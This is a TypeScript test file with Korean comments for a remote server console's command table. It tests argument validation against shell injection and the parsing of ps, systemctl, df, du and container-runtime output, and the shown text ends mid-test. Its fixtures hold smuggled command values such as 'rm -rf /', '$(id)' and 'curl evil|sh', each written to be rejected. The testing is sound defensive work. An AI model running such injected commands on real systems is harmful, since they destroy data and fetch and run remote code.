// F26 서버 콘솔 명령 표 — 이 파일이 지키는 것은 두 가지다.
//
// 1) **인자 검증**: 렌더러가 고른 값이 원격 셸에 그대로 흘러들지 않는가. 여기가 뚫리면 SSH 세션이
//    임의 원격 실행 채널이 된다(F23 이 MCP `shell` 자유 문자열을 S1 결함으로 들어낸 것과 같은 선).
// 2) **파서**: 배포판마다 다른 실제 출력을 제대로 읽는가. 잘못 읽으면 엉뚱한 PID 를 kill 한다.
import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import {
  COMMANDS,
  buildCommand,
  isCmdId,
  parseDf,
  parseDu,
  parsePs,
  parseSystemctl,
  systemdMissing,
  validAbsPath,
  validPid,
  validSignal,
  validSvcAction,
  validUnit,
  OVERVIEW_SEP,
  PROBE_BINS,
  parseOverview,
  parsePkgProbe,
  parseContainers,
  parseCtrList,
  sortContainers,
  ctrUnavailable,
  ctrNeedsRoot,
  ctrSudoFailed,
  sqEscape,
  cpuPercent,
  CTR_MARK,
  validCtrId,
  validCtrAction,
  validImageRef,
  buildCtrExec,
  isPrivileged,
  parseAppTrace,
  type CmdId
} from '../src/shared/remoteCatalog'

describe('인자 검증 — PID', () => {
  it('정상 PID 는 통과', () => {
    expect(validPid(1)).toBe(1)
    expect(validPid(31337)).toBe(31337)
  })

  it('★ 0 과 음수는 거절 — kill(2) 에서 프로세스 그룹 전체를 뜻한다(서버가 통째로 죽는다)', () => {
    expect(validPid(0)).toBeNull()
    expect(validPid(-1)).toBeNull()
    expect(validPid(-31337)).toBeNull()
  })

  it('★ 문자열은 숫자처럼 생겼어도 거절 — 뒤에 뭐가 붙어 올 수 있다', () => {
    expect(validPid('123')).toBeNull()
    expect(validPid('123; rm -rf /')).toBeNull()
  })

  it('소수·NaN·Infinity 거절', () => {
    expect(validPid(1.5)).toBeNull()
    expect(validPid(NaN)).toBeNull()
    expect(validPid(Infinity)).toBeNull()
  })

  it('말도 안 되는 큰 값은 거절(PID 상한 밖)', () => {
    expect(validPid(99_999_999)).toBeNull()
  })
})

describe('인자 검증 — systemd 유닛 이름', () => {
  it('평범한 유닛 이름은 통과(@ 인스턴스 포함)', () => {
    expect(validUnit('nginx.service')).toBe('nginx.service')
    expect(validUnit('getty@tty1.service')).toBe('getty@tty1.service')
  })

  it('★ 셸 메타문자는 전부 거절 — 인용으로 막지 않고 아예 안 받는다', () => {
    for (const bad of [
      'nginx.service; rm -rf /',
      'nginx.service && reboot',
      'nginx.service | tee /etc/passwd',
      'nginx$(id).service',
      'nginx`id`.service',
      "nginx'.service",
      'nginx .service',
      'nginx\n.service',
      // 백슬래시: 주입까지는 아니어도 `a\ b` 로 인자 경계를 흔든다
      'nginx\\ b.service',
      '../../etc/passwd'
    ]) {
      expect(validUnit(bad), bad).toBeNull()
    }
  })

  it('빈 문자열·문자열 아님·과도한 길이 거절', () => {
    expect(validUnit('')).toBeNull()
    expect(validUnit(null)).toBeNull()
    expect(validUnit(42)).toBeNull()
    expect(validUnit('a'.repeat(300))).toBeNull()
  })
})

describe('인자 검증 — 시그널·서비스 동작·경로', () => {
  it('시그널은 TERM·KILL 둘만', () => {
    expect(validSignal('TERM')).toBe('TERM')
    expect(validSignal('KILL')).toBe('KILL')
    expect(validSignal('9')).toBeNull()
    expect(validSignal('STOP')).toBeNull()
  })

  it('서비스 동작은 start·stop·restart 셋만 — enable/disable 은 부팅 동작을 바꾼다', () => {
    expect(validSvcAction('restart')).toBe('restart')
    expect(validSvcAction('enable')).toBeNull()
    expect(validSvcAction('mask')).toBeNull()
  })

  it('경로는 절대경로만, 따옴표·공백·개행 있으면 거절', () => {
    expect(validAbsPath('/var/log')).toBe('/var/log')
    expect(validAbsPath('var/log')).toBeNull()
    expect(validAbsPath("/var/log'; rm -rf /")).toBeNull()
    expect(validAbsPath('/var/my logs')).toBeNull()
    expect(validAbsPath('/var/log\nrm -rf /')).toBeNull()
  })
})

describe('명령 조립', () => {
  it('표에 없는 id 는 아무것도 만들지 않는다', () => {
    expect(isCmdId('ps.list')).toBe(true)
    expect(isCmdId('rm.rf')).toBe(false)
    expect(buildCommand('rm.rf', {})).toBeNull()
    expect(buildCommand(null, {})).toBeNull()
    // 프로토타입 오염 경로로 표를 뚫으려는 시도
    expect(buildCommand('toString', {})).toBeNull()
    expect(buildCommand('constructor', {})).toBeNull()
  })

  /**
   * ★ 2026-08-27 준영님 제보의 진짜 원인. `app.trace` 가 템플릿 문자열에 `'\0\n\r'` 를 한 겹으로 적어
   * **진짜 NUL·개행**을 명령에 실어 보냈고, sshd 는 NUL 이 든 exec 요청을 거부하면서 **커넥션을 끊었다** —
   * 그래서 [로그] 를 누를 때마다 "로그를 찾지 못했습니다" + 세션 끊김이 같이 났다.
   *
   * 표 전체를 훑는다: 한 명령의 실수가 세션을 죽이므로 새 명령이 늘어도 여기서 걸려야 한다.
   * 탭은 막지 않는다(`--format '{{.ID}}\t…'` 처럼 일부러 쓴다) — 치명적인 것은 NUL·개행뿐이다.
   */
  it('★ 어떤 명령도 NUL·개행을 원격에 보내지 않는다 (sshd 가 커넥션을 끊는다)', () => {
    const sample = { port: 8000, pid: 1234, pane: 'dev:0.1', signal: 'TERM', unit: 'nginx.service', action: 'start', path: '/home/jun/app', name: 'wt', dest: '/home/jun/wt', cli: 'claude' }
    for (const id of Object.keys(COMMANDS)) {
      const cmd = buildCommand(id, sample)?.cmd
      if (cmd === undefined) continue
      expect.soft(cmd, `${id} 에 제어문자가 실렸다`).not.toMatch(/[\0\r\n]/)
    }
    // 문지기 자체도 확인한다 — 표를 통과해도 제어문자가 있으면 나가지 못한다.
    expect(buildCommand('app.trace', { port: 8000 })?.cmd).not.toMatch(/[\0\r\n]/)
  })

  it('읽기 명령은 인자 없이 조립된다', () => {
    expect(buildCommand('ps.list', undefined)?.cmd).toContain('ps -eo')
    expect(buildCommand('ps.list', undefined)?.write).toBe(false)
  })

  it('★ 쓰기 명령은 write 로 표시된다 — 호출측이 확인 다이얼로그를 띄우는 근거다', () => {
    expect(buildCommand('ps.kill', { pid: 10, signal: 'TERM' })?.write).toBe(true)
    expect(buildCommand('svc.action', { unit: 'nginx.service', action: 'restart' })?.write).toBe(true)
    expect(buildCommand('disk.usage', undefined)?.write).toBe(false)
  })

  it('kill 은 검증된 PID·시그널로만 조립된다', () => {
    expect(buildCommand('ps.kill', { pid: 4242, signal: 'KILL' })?.cmd).toBe('kill -KILL 4242 2>&1')
  })

  it('★ 인자가 하나라도 틀리면 null — 부분 조립은 없다', () => {
    expect(buildCommand('ps.kill', { pid: 0, signal: 'TERM' })).toBeNull()
    expect(buildCommand('ps.kill', { pid: 10, signal: 'HUP' })).toBeNull()
    expect(buildCommand('ps.kill', {})).toBeNull()
    expect(buildCommand('svc.action', { unit: 'a; reboot', action: 'start' })).toBeNull()
    expect(buildCommand('svc.action', { unit: 'nginx.service', action: 'mask' })).toBeNull()
    expect(buildCommand('disk.du', { path: '/tmp; id' })).toBeNull()
  })

  it('du 경로는 작은따옴표로 감싼다', () => {
    expect(buildCommand('disk.du', { path: '/var/log' })?.cmd).toContain("'/var/log'")
  })

  // F27: AI CLI 설치 확인. 실행 전에 물어 보지 않으면 터미널에 `command not found` 한 줄만 남는다.
  it('which.cli 는 command -v 로 조립된다 — which(1) 이 없는 서버에서도 통하는 셸 내장', () => {
    expect(buildCommand('which.cli', { bin: 'claude' })?.cmd).toBe('command -v claude 2>/dev/null')
    expect(buildCommand('which.cli', { bin: 'claude' })?.write).toBe(false)
    expect(buildCommand('which.cli', { bin: '/usr/local/bin/my-cli' })?.cmd).toBe(
      'command -v /usr/local/bin/my-cli 2>/dev/null'
    )
  })

  it('★ which.cli 의 이름 검증은 shared/aiCli 것과 같은 것을 쓴다 — 확인한 이름과 실행할 이름이 갈리면 안 된다', () => {
    expect(buildCommand('which.cli', { bin: 'claude; curl evil|sh' })).toBeNull()
    expect(buildCommand('which.cli', { bin: 'claude && whoami' })).toBeNull()
    expect(buildCommand('which.cli', { bin: '$(id)' })).toBeNull()
    expect(buildCommand('which.cli', { bin: '' })).toBeNull()
    expect(buildCommand('which.cli', {})).toBeNull()
    expect(buildCommand('which.cli', undefined)).toBeNull()
  })

  it('★ 표의 모든 항목이 인자 없이 불려도 죽지 않는다 — 렌더러가 뭘 보내든 예외는 안 난다', () => {
    for (const id of Object.keys(COMMANDS)) {
      expect(() => buildCommand(id, undefined)).not.toThrow()
      expect(() => buildCommand(id, { pid: 'x', unit: 1, path: [] })).not.toThrow()
    }
  })
})

describe('ps 출력 파싱', () => {
  // 실제 `ps -eo pid=,user=,pcpu=,pmem=,rss=,stat=,etimes=,args=` 모양.
  const OUT = [
    '    1 root      0.0  0.1  12345 Ss     864000 /sbin/init splash',
    ' 1234 jun      12.5  3.2 205000 Sl      12345 /usr/bin/node /srv/app/server.js --port 3000',
    ' 9999 postgres  0.3  8.1 900000 S      864000 postgres: checkpointer',
    ' 4242 jun       0.0  0.0      0 Z           5 [defunct]'
  ].join('\n')

  it('한 줄에 하나씩 읽는다', () => {
    expect(parsePs(OUT)).toHaveLength(4)
  })

  it('★ 공백이 든 명령줄이 잘리지 않는다 — 앞 7칸만 끊고 나머지는 통째로 명령이다', () => {
    const node = parsePs(OUT).find((r) => r.pid === 1234)!
    expect(node.cmd).toBe('/usr/bin/node /srv/app/server.js --port 3000')
    expect(node.user).toBe('jun')
    expect(node.cpu).toBe(12.5)
    expect(node.mem).toBe(3.2)
    expect(node.rssKb).toBe(205000)
  })

  it('콜론·대괄호가 든 명령줄도 그대로', () => {
    expect(parsePs(OUT).find((r) => r.pid === 9999)!.cmd).toBe('postgres: checkpointer')
    expect(parsePs(OUT).find((r) => r.pid === 4242)!.cmd).toBe('[defunct]')
  })

  it('좀비 상태가 보존된다 — 화면에서 눈에 띄게 해야 한다', () => {
    expect(parsePs(OUT).find((r) => r.pid === 4242)!.stat).toBe('Z')
  })

  it('빈 출력·쓰레기 줄은 조용히 버린다(빈 배열, 예외 없음)', () => {
    expect(parsePs('')).toEqual([])
    expect(parsePs('ps: command not found')).toEqual([])
    expect(parsePs('\n\n   \n')).toEqual([])
  })
})

describe('systemctl 출력 파싱', () => {
  const OUT = [
    '  nginx.service                loaded active   running The nginx HTTP and reverse proxy server',
    '● postgresql.service           loaded failed   failed  PostgreSQL RDBMS',
    '  getty@tty1.service           loaded active   running Getty on tty1',
    '  cups.service                 not-found inactive dead  cups.service'
  ].join('\n')

  it('유닛·상태·설명을 갈라 읽는다', () => {
    const rows = parseSystemctl(OUT)
    expect(rows).toHaveLength(4)
    expect(rows[0]).toEqual({
      unit: 'nginx.service',
      load: 'loaded',
      active: 'active',
      sub: 'running',
      desc: 'The nginx HTTP and reverse proxy server'
    })
  })

  it('★ 실패한 유닛 앞의 ● 표시를 걷어낸다 — 안 걷으면 유닛 이름이 ● 가 된다', () => {
    const failed = parseSystemctl(OUT).find((r) => r.unit === 'postgresql.service')!
    expect(failed.active).toBe('failed')
  })

  it('@ 인스턴스 유닛도 읽는다', () => {
    expect(parseSystemctl(OUT).some((r) => r.unit === 'getty@tty1.service')).toBe(true)
  })

  it('systemd 가 없는 서버를 구분한다 — 빈 목록과 "지원 안 함"은 다른 이야기다', () => {
    expect(systemdMissing('bash: systemctl: command not found')).toBe(true)
    expect(systemdMissing('Failed to connect to bus: No such file or directory')).toBe(true)
    expect(systemdMissing(OUT)).toBe(false)
  })
})

describe('df 출력 파싱', () => {
  const OUT = [
    'Filesystem     Type     1024-blocks      Used Available Capacity Mounted on',
    '/dev/sda1      ext4        41251136  12345678  26800000      32% /',
    'tmpfs          tmpfs        4096000         0   4096000       0% /dev/shm',
    '/dev/sdb1      xfs        209715200 199229440  10485760      95% /data'
  ].join('\n')

  it('헤더를 건너뛰고 항목만 읽는다', () => {
    const rows = parseDf(OUT)
    expect(rows).toHaveLength(3)
    expect(rows[0].mount).toBe('/')
    expect(rows[0].type).toBe('ext4')
    expect(rows[0].usePct).toBe(32)
  })

  it('가상 파일시스템도 그대로 돌려준다 — 무엇을 숨길지는 화면이 정한다', () => {
    expect(parseDf(OUT).some((r) => r.type === 'tmpfs')).toBe(true)
  })

  it('공백이 든 마운트 경로도 끝까지 읽는다', () => {
    const rows = parseDf('/dev/sdc1 ext4 100 50 50 50% /mnt/my disk')
    expect(rows[0].mount).toBe('/mnt/my disk')
  })

  it('빈 출력은 빈 배열', () => {
    expect(parseDf('')).toEqual([])
  })
})

describe('du 출력 파싱', () => {
  it('큰 폴더부터 정렬해 돌려준다 — 용량 찾을 때 위에서부터 본다', () => {
    const rows = parseDu(['4\t/var/log/small', '1048576\t/var/log/journal', '2048\t/var/log/nginx'].join('\n'))
    expect(rows.map((r) => r.path)).toEqual(['/var/log/journal', '/var/log/nginx', '/var/log/small'])
    expect(rows[0].kb).toBe(1048576)
  })

  it('공백이 든 경로도 읽는다', () => {
    expect(parseDu('123\t/var/my logs')[0].path).toBe('/var/my logs')
  })

  it('빈 출력·쓰레기는 빈 배열', () => {
    expect(parseDu('')).toEqual([])
    expect(parseDu('du: cannot read directory')).toEqual([])
  })
})

// ── F26 R3 ──────────────────────────────────────────────────────────────────

describe('서버 개요 파싱(sys.overview)', () => {
  const join = (...p: string[]) => p.join(`\n${OVERVIEW_SEP}\n`)

  it('배포판·커널·호스트명·가동시간을 한 왕복 출력에서 읽는다', () => {
    const o = parseOverview(join('Ubuntu 22.04.4 LTS', '5.15.0-91-generic', 'Linux', 'dev-server', '1053492.31 2100.5'))
    expect(o.distro).toBe('Ubuntu 22.04.4 LTS')
    expect(o.kernel).toBe('5.15.0-91-generic')
    expect(o.hostname).toBe('dev-server')
    expect(o.uptimeSec).toBe(1053492)
  })

  it('/etc/os-release 가 없으면 uname 으로 떨어진다 — 전체를 실패로 만들지 않는다', () => {
    const o = parseOverview(join('', '4.19.0', 'Linux', 'router', '900.00 100.0'))
    expect(o.distro).toBe('Linux') // 빈칸 대신 아는 것
    expect(o.kernel).toBe('4.19.0')
  })

  it('가동시간을 못 읽으면 null — 0 으로 쓰면 "방금 켜짐"이라는 거짓말이 된다', () => {
    expect(parseOverview(join('D', 'k', 'Linux', 'h', '')).uptimeSec).toBeNull()
    expect(parseOverview(join('D', 'k', 'Linux', 'h', 'garbage')).uptimeSec).toBeNull()
  })

  it('출력이 통째로 비어도 던지지 않는다', () => {
    const o = parseOverview('')
    expect(o.distro).toBe('')
    expect(o.uptimeSec).toBeNull()
  })
})

describe('설치된 프로그램 파싱(pkg.probe)', () => {
  it('bin·경로·버전·설치일을 읽고, nvm 처럼 홈 밑에 깐 것도 그대로 잡는다', () => {
    const out = [
      'node\t/home/jun/.nvm/versions/node/v20.11.1/bin/node\tv20.11.1\t1710374400',
      'git\t/usr/bin/git\tgit version 2.43.0\t1699999999'
    ].join('\n')
    const rows = parsePkgProbe(out)
    expect(rows).toHaveLength(2)
    expect(rows[0].bin).toBe('node')
    expect(rows[0].path).toContain('.nvm') // 패키지 목록에는 없는 것 — 이게 이 방식을 쓰는 이유다
    expect(rows[0].installedAt).toBe(1710374400 * 1000)
    // 앞에 붙는 자기 이름은 걷어 낸다.
    expect(rows[1].version).toBe('2.43.0')
  })

  it('콜론 형태(`nginx version: nginx/1.24.0`)도 걷어 낸다 — CON-19 가 잡은 구멍', () => {
    const rows = parsePkgProbe('nginx	/usr/sbin/nginx	nginx version: nginx/1.24.0	1699999999')
    expect(rows[0].version).toBe('nginx/1.24.0')
  })

  it('이름에 정규식 특수문자가 있어도 안전하다', () => {
    expect(parsePkgProbe('c++	/usr/bin/c++	c++ 11.4.0	1').at(0)?.version).toBe('11.4.0')
  })

  it('버전 형태를 못 알아보면 원문을 그대로 싣는다(억지로 자르지 않는다)', () => {
    expect(parsePkgProbe('mystery\t/usr/bin/mystery\tbuild 7 (deadbeef)\t0')[0].version).toBe('build 7 (deadbeef)')
  })

  it('mtime 이 없거나 0 이면 설치일은 null(1970년으로 표시하지 않는다)', () => {
    expect(parsePkgProbe('jq\t/usr/bin/jq\t1.6\t')[0].installedAt).toBeNull()
    expect(parsePkgProbe('jq\t/usr/bin/jq\t1.6\t0')[0].installedAt).toBeNull()
  })

  it('없는 프로그램은 줄 자체가 없다 · 깨진 줄은 건너뛴다', () => {
    expect(parsePkgProbe('')).toEqual([])
    expect(parsePkgProbe('쓰레기\n\n\tpath만있음\t\t')).toEqual([])
  })

  // 2026-08-24 준영님 제보 — kubectl 칸에 `error: unknown flag: --ver…` 만 보였다.
  // 모두가 `--version` 을 아는 것은 아니다(kubectl·go·helm 은 `version` 하위 명령, 자바 8 은
  // `-version`, nginx·httpd 는 `-V`). 셸이 차례로 물어보고, 파서가 오류 문구를 한 번 더 거른다.
  it('★ 오류 문구는 버전이 아니다 — 칸을 비운다(화면이 `—` 로 그린다)', () => {
    expect(parsePkgProbe('kubectl\t/usr/bin/kubectl\terror: unknown flag: --version\t1').at(0)?.version).toBe('')
    expect(parsePkgProbe('go\t/usr/bin/go\tflag provided but not defined: -version\t1').at(0)?.version).toBe('')
  })

  it('★ kubectl 이 `version` 으로 답한 머리(`Client Version:`)를 걷어 낸다', () => {
    expect(parsePkgProbe('kubectl\t/usr/bin/kubectl\tClient Version: v1.29.0\t1').at(0)?.version).toBe('v1.29.0')
  })

  it('자바 8 의 `-version` 형태도 그대로 읽는다', () => {
    expect(parsePkgProbe('java\t/usr/bin/java\tjava version "1.8.0_382"\t1').at(0)?.version).toBe('"1.8.0_382"')
  })

  it('명령은 여러 후보를 차례로 물어보고 숫자가 든 줄만 받는다', () => {
    const cmd = buildCommand('pkg.probe', null)!.cmd
    expect(cmd).toContain("for f in --version 'version --client' version -version -V")
    expect(cmd).toContain('*[0-9]*') // 숫자 없는 줄 = 오류 문구
    expect(cmd).toContain('*nknown*') // 숫자가 든 오류 문구도 버린다(python 실측)
    // 소문자 -v 는 후보에 없다 — vim·mysql 에서 버전이 아니라 다른 동작이다.
    expect(cmd).not.toContain(" -v;")
  })
})

// 명령 하나가 아니라 **표 전체**가 지켜야 하는 규칙이다. pkg.probe 한 곳만 고치면 다음에 새 명령을
// 넣는 사람이 같은 함정을 다시 밟는다 — 그래서 소스를 통째로 훑는다(2026-08-13 빈 표 사고).
describe('셸 이식성 — echo 로 이스케이프를 내보내지 않는다', () => {
  it('★ 명령 표 어디에도 백슬래시 이스케이프를 담은 echo 가 없다', () => {
    const src = readFileSync(join(__dirname, '../src/shared/remoteCatalog.ts'), 'utf8')
    // 주석 줄은 뺀다 — 이 규칙을 설명하는 주석 자체가 걸린다.
    const offenders = src
      .split('\n')
      .filter((l) => !l.trim().startsWith('//'))
      // 소스에 `\\t`(문자열 리터럴) 로 적히든 `\t`(템플릿) 로 적히든 둘 다 잡는다.
      .filter((l) => /echo\s+["'][^"']*\\\\?[nt]/.test(l))
    expect(offenders).toEqual([])
  })
})

describe('pkg.probe 보안 — 조사 목록은 고정이고 안전한 이름만', () => {
  it('렌더러가 이름을 못 보낸다 — args 를 무엇으로 주든 같은 명령이 나온다', () => {
    const a = buildCommand('pkg.probe', null)
    const b = buildCommand('pkg.probe', { bins: ['; rm -rf /'] })
    expect(a).not.toBeNull()
    expect(a!.cmd).toBe(b!.cmd) // 인자가 명령에 영향을 주지 않는다
    expect(a!.write).toBe(false)
  })

  it('고정 목록의 모든 이름이 셸 메타문자 없는 순수 이름이다', () => {
    for (const b of PROBE_BINS) expect(b).toMatch(/^[a-z0-9][a-z0-9._-]*$/)
  })

  it('조사 목록의 이름이 전부 명령에 들어간다(빠뜨린 것 없음)', () => {
    const cmd = buildCommand('pkg.probe', null)!.cmd
    for (const b of PROBE_BINS) expect(cmd).toContain(`b=${b};`)
  })

  it('★ 줄을 조립할 때 echo 가 아니라 printf 를 쓴다 — bash 내장 echo 는 \\t 를 탭으로 안 바꾼다', () => {
    const cmd = buildCommand('pkg.probe', null)!.cmd
    expect(cmd).toContain("printf '%s\\t%s\\t%s\\t%s\\n'")
    expect(cmd).not.toContain('echo "$b')
  })

  it('sys.overview 도 인자를 받지 않는다(읽기 전용·고정)', () => {
    const o = buildCommand('sys.overview', { anything: 'x' })
    expect(o).not.toBeNull()
    expect(o!.write).toBe(false)
    expect(o!.cmd).toContain(OVERVIEW_SEP)
  })
})

// ── F28 컨테이너 ────────────────────────────────────────────────────────────

describe('컨테이너 목록 파싱(ctr.list)', () => {
  const OUT = [
    'a1b2c3\tweb\tnginx:1.24\trunning\tUp 3 days\t0.0.0.0:80->80/tcp',
    'd4e5f6\tdb\tpostgres:16\texited\tExited (0) 2 hours ago\t',
    '99aa\tcache\tredis:7\trunning\tUp 10 minutes\t6379/tcp'
  ].join('\n')

  it('6칸을 읽고 상태는 소문자로 맞춘다', () => {
    const rows = parseContainers(OUT)
    expect(rows).toHaveLength(3)
    expect(rows[0]).toEqual({
      id: 'a1b2c3',
      name: 'web',
      image: 'nginx:1.24',
      state: 'running',
      status: 'Up 3 days',
      ports: '0.0.0.0:80->80/tcp'
    })
  })

  it('멈춘 컨테이너는 포트 칸이 비어 있어도 읽는다', () => {
    expect(parseContainers(OUT)[1].ports).toBe('')
    expect(parseContainers(OUT)[1].state).toBe('exited')
  })

  it('멈춘 것이 위로 온다 — "뭐가 죽었나"가 이 화면을 여는 이유다', () => {
    expect(sortContainers(parseContainers(OUT)).map((r) => r.name)).toEqual(['db', 'cache', 'web'])
  })

  it('형태가 아닌 줄(권한 오류 등)은 건너뛴다', () => {
    expect(parseContainers('permission denied while trying to connect')).toEqual([])
    expect(parseContainers('')).toEqual([])
  })

  it('런타임 없음·데몬 못 붙음·권한 없음을 빈 목록과 구분한다', () => {
    expect(ctrUnavailable('docker: command not found')).toBe(true)
    expect(ctrUnavailable('Cannot connect to the Docker daemon at unix:///var/run/docker.sock')).toBe(true)
    expect(ctrUnavailable('permission denied while trying to connect to the Docker daemon socket')).toBe(true)
    // 진짜로 컨테이너가 하나도 없는 경우는 안내가 아니라 빈 표다.
    expect(ctrUnavailable('')).toBe(false)
  })

  it('명령은 docker 를 먼저 보고 없으면 podman 으로 떨어진다 · 인자를 받지 않는다', () => {
    const a = buildCommand('ctr.list', null)
    const b = buildCommand('ctr.list', { name: '; rm -rf /' })
    expect(a!.cmd).toBe(b!.cmd) // 렌더러가 명령에 영향을 줄 수 없다
    expect(a!.write).toBe(false) // 목록은 읽기 전용
    expect(a!.cmd).toContain('command -v docker')
    expect(a!.cmd).toContain('podman ps -a')
  })
})

// ── 2026-08-24 준영님 제보: 쿠버네티스 워커 노드에서 아무것도 안 뜬다 ─────────────────
// k8s 1.24+ 워커에는 docker 가 없다(dockershim 제거) — containerd + crictl 이다. 게다가 셋 다
// 없을 때 출력이 **빈 문자열**이라 "런타임 없음"과 "컨테이너 0개"가 구분되지 않았다.
describe('쿠버네티스 노드(crictl)', () => {
  const CRICTL_JSON = JSON.stringify({
    containers: [
      {
        id: 'a'.repeat(64),
        metadata: { name: 'coredns', attempt: 0 },
        image: { image: 'registry.k8s.io/coredns/coredns:v1.11.1' },
        imageRef: 'sha256:' + 'b'.repeat(64),
        state: 'CONTAINER_RUNNING',
        labels: {
          'io.kubernetes.container.name': 'coredns',
          'io.kubernetes.pod.name': 'coredns-5d78c9869d-4x2qp',
          'io.kubernetes.pod.namespace': 'kube-system'
        }
      },
      {
        id: 'c'.repeat(64),
        metadata: { name: 'app', attempt: 3 },
        image: { image: 'reg.local:5000/team/app:1.2.3' },
        state: 'CONTAINER_EXITED',
        labels: { 'io.kubernetes.pod.name': 'app-7d9', 'io.kubernetes.pod.namespace': 'prod' }
      }
    ]
  })

  it('★ crictl 표시가 붙으면 JSON 으로 읽는다 — 워커 노드에서 목록이 뜬다', () => {
    const list = parseCtrList(`${CTR_MARK}crictl\n${CRICTL_JSON}`)
    expect(list.runtime).toBe('crictl')
    expect(list.unavailable).toBe(false)
    expect(list.rows.map((r) => r.name)).toEqual(['coredns', 'app'])
    expect(list.rows[0].state).toBe('running')
    expect(list.rows[1].state).toBe('exited')
  })

  it('★ 셋째 칸에 네임스페이스/파드를 싣는다 — 같은 이름의 컨테이너를 구분하는 유일한 단서다', () => {
    const rows = parseCtrList(`${CTR_MARK}crictl\n${CRICTL_JSON}`).rows
    expect(rows[0].status).toBe('kube-system/coredns-5d78c9869d-4x2qp')
    expect(rows[1].status).toBe('prod/app-7d9')
    expect(rows[0].ports).toBe('') // CRI 는 포트를 컨테이너가 아니라 파드가 들고 있다
  })

  it('crictl 이 앞에 뱉는 WARN 줄이 섞여도 읽는다(2>&1 로 합쳐 받는다)', () => {
    const noisy = `${CTR_MARK}crictl\nWARN[0000] runtime connect using default endpoints\n${CRICTL_JSON}`
    expect(parseCtrList(noisy).rows).toHaveLength(2)
  })

  it('★ 런타임이 하나도 없으면 "컨테이너 0개"가 아니라 안내로 간다(제보의 절반)', () => {
    const list = parseCtrList(`${CTR_MARK}none\n`)
    expect(list.runtime).toBe('none')
    expect(list.rows).toEqual([])
    expect(list.unavailable).toBe(true)
  })

  it('권한이 없어 소켓에 못 붙는 것도 안내로 간다(crictl 은 대개 root)', () => {
    const out = `${CTR_MARK}crictl\nFATA[0000] connect: connect endpoint 'unix:///run/containerd/containerd.sock', make sure you are running as root: permission denied`
    expect(parseCtrList(out).unavailable).toBe(true)
  })

  // 2026-08-24 후속 제보 — "워커 노드에서 여전히 안 나온다". 그때 화면에 **왜인지가 없었다**:
  // 런타임이 없는 것과 있는데 실패한 것을 같은 문장으로 덮고 서버가 준 줄을 버렸다.
  it('★ 런타임은 있는데 실패하면 서버가 준 첫 줄을 그대로 들고 온다', () => {
    const list = parseCtrList(`${CTR_MARK}crictl\nFATA[0000] validate service connection: permission denied`)
    expect(list.runtime).toBe('crictl')
    expect(list.reason).toBe('FATA[0000] validate service connection: permission denied')
  })

  it('아무것도 못 찾았을 때는 이유가 없다 — 서버가 아무 말도 하지 않았다', () => {
    expect(parseCtrList(`${CTR_MARK}none\n`).reason).toBeNull()
  })

  it('정상 목록에는 이유가 붙지 않는다', () => {
    expect(parseCtrList(`${CTR_MARK}docker\na1b2c3\tweb\tnginx\trunning\tUp 1 day\t`).reason).toBeNull()
  })

  // 2026-08-24 세 번째 라운드 — 준영님 실측으로 원인이 잡혔다. 그 워커 노드에는 **podman 도** 깔려
  // 있었고(루트리스, 컨테이너 0개), 우리는 "먼저 발견된 하나"에서 멈춰 podman 의 빈 목록을 답으로
  // 삼았다. 정작 컨테이너는 containerd 에 있었다 → "있는 것"이 아니라 "답을 준 것"을 고른다.
  it('★ podman 이 빈 목록을 줘도 crictl 이 답하면 crictl 을 쓴다(제보의 진짜 원인)', () => {
    const out = `${CTR_MARK}podman\n\n${CTR_MARK}crictl\n${CRICTL_JSON}`
    const list = parseCtrList(out)
    expect(list.runtime).toBe('crictl')
    expect(list.rows.map((r) => r.name)).toEqual(['coredns', 'app'])
  })

  it('★ 아무도 행을 못 주면 진짜 실패한 토막의 이유를 보여 준다(빈 podman 이 아니라 crictl 권한)', () => {
    const fata = 'level=fatal msg="validate service connection: … connect: permission denied"'
    const list = parseCtrList(`${CTR_MARK}podman\n\n${CTR_MARK}crictl\n${fata}`)
    expect(list.runtime).toBe('crictl')
    expect(list.unavailable).toBe(true)
    expect(list.reason).toBe(fata)
  })

  // 세 번째에도 "컨테이너가 없습니다"만 떴다 — 루트리스 podman 이 **경고 한 줄**을 뱉으면 우리는
  // "답을 받았다"고 보고 거기서 멈췄고, 그 한 줄은 행이 아니라서 0개가 됐다. 두 곳을 고쳤다:
  // 셸은 **행이 있을 때만** 멈추고, 파서는 **못 읽은 출력을 그대로 올린다**.
  it('★ podman 이 경고 한 줄만 뱉어도 멈추지 않고, 화면에는 crictl 의 진짜 이유가 간다', () => {
    const warn = 'WARN[0000] "/" is not a shared mount, this could cause issues'
    const fata = 'level=fatal msg="… connect: permission denied"'
    const list = parseCtrList(`${CTR_MARK}podman\n${warn}\n${CTR_MARK}crictl\n${fata}`)
    expect(list.runtime).toBe('crictl') // 아는 실패가 못 읽은 출력을 이긴다
    expect(list.reason).toBe(fata)
  })

  it('★ 못 읽은 출력은 조용히 "0개"가 되지 않는다 — 그대로 보여 준다', () => {
    const odd = 'Emulate Docker CLI using podman. Create /etc/containers/nodocker to quiet msg'
    const list = parseCtrList(`${CTR_MARK}podman\n${odd}`)
    expect(list.unavailable).toBe(true)
    expect(list.reason).toBe(odd)
  })

  it('crictl 의 정상적인 0개(`{"containers":[]}`)는 안내가 아니라 빈 표다', () => {
    const list = parseCtrList(`${CTR_MARK}crictl\n{"containers":[]}`)
    expect(list.unavailable).toBe(false)
    expect(list.rows).toEqual([])
  })

  it('셸은 행 표식(탭 · "id")을 봤을 때만 다음 런타임을 건너뛴다', () => {
    const cmd = buildCommand('ctr.list', null)!.cmd
    expect(cmd).toContain(`*'\t'*) d=1`) // docker·podman 은 우리 형식의 탭
    // #192: crictl 이 컨테이너 탭으로 왔다 — 같은 스크립트 안이고, 표식만 JSON 의 id 다.
    expect(cmd).toContain(`*'"id"'*`)
  })

  it('전부 성공했는데 비어 있으면 첫 런타임으로 "0개"라고 말한다(안내가 아니다)', () => {
    const list = parseCtrList(`${CTR_MARK}docker\n\n${CTR_MARK}podman\n`)
    expect(list.runtime).toBe('docker')
    expect(list.unavailable).toBe(false)
    expect(list.rows).toEqual([])
  })

  it('★ 소켓 권한에 막히면 프롬프트가 뜰 수 없는 sudo -n 으로 한 번만 더 시도한다', () => {
    // #192: crictl 은 컨테이너 탭(ctr.list)의 것이다 — 권한 올리기 조각은 그대로 따라왔다.
    const cmd = buildCommand('ctr.list', null)!.cmd
    expect(cmd).toContain('sudo -n crictl ps -a -o json')
    expect(cmd).toContain('*ermission*')
